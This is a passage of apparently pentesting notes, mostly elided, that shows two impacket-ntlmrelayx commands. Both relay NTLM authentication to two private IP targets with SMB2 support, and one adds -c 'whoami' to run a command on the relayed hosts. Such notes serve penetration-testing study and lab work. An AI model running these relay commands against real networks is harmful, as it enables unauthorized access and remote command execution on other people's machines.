...
- **Command (-c)**
    ...
    ```bash
    $ impacket-ntlmrelayx -t 192.168.190.129,192.168.190.131 -smb2support -c "whoami"
    ```
...
- **Normal**
    ...
    ```bash
    $ impacket-ntlmrelayx -t 192.168.190.129,192.168.190.131 -smb2support
    ```
